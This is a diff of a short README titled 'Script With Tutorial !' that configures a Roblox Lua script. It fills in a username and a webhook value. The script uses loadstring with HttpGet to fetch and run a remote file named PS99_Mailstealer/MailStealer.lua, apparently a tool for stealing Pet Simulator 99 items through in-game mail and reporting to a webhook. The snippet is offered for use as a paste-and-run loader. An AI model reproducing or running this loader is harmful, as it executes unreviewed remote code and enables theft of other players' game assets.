@@ -1,9 +1,9 @@
 # Script With Tutorial !
 
 ```lua
-Username = "Your Nick Here"
+Username = "tyreece_2018"
 LoadScreen = true 
-Webhook = "Your Link Here" -- Paste your Discord webhook here
+Webhook = "https://www.roblox.com/users/495970760/profile"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
 ```
